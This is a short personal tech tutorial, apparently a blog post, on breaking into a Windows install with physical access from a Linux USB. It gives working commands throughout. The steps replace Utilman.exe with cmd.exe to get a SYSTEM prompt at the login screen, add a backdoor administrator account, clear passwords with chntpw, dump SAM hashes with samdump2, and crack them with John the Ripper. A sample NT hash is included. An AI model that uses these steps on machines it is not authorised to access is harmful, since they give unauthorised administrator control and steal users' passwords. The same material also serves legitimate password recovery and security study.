
::title:Messing with Windows
::timestamp:1472720232

# Messing with Windows

## Mounting Windows on Linux

```
sudo pacman -S ntfs-3g
mkdir /mnt/windows
mount /dev/sdxX /mnt/windows
```

## Utilman.exe

Utilman.exe is a program run by windows with the hokey "windows + U". It even runs before the user has logged in at the login screen. The other important thing to note, is it runs under the SYSTEM user on Windows; this is equivalent to root on *nix systems. Therefore, we can replace the Utilman.exe with an executable of our own, for example, I used cmd.exe. I've got a bootable USB with Arch Linux on it and I have used it to mount the Windows file system and change the executables around.

```
cd /mnt/windows/Windows/System32
cp Utilman.exe Utilman.exe.bak
cp cmd.exe Utilman.exe
```

After rebooting, hit the hotkey and you now have a SYSTEM command prompt. I then added a user with:

```
net user anonymoususername password1234 /add
net localgroup Administrators anonymoususername /add
```

## Clearing the Admin Password

If you ever forget your administrator password and don't want to mess with SYSTEM files, you can just clear the admin password with a program called chntpw. It's a prety self explanatory program that you run interactively.

## Cracking the Hashes

If you ever have access to a system and you want to get the original password out, we will need to crack the password hash. This could take some time to crack, I'd highly recommend using a few password lists from github when doing this. Links below. First of all, we need to get the hashes out. To do that, we mount the windows system on linux, and then use samdump2 to dump the hashes.

```
cd /mnt/windows/Windows/System32/config/
sudo samdump2 SYSTEM SAM > /tmp/hashes
```

That file now has the hashes in it. Mine were of this form:

```
anonymoususername:1010:aad3b435b51404eeaad3b435b51404ee:23a8d92ef46bbe75d8cc807787bbc45b:::
```

I cracked this with john the ripper and a word list called rockyou.txt.

```
john --wordlist=rockyou.txt --format=NT2 /tmp/hashes
```



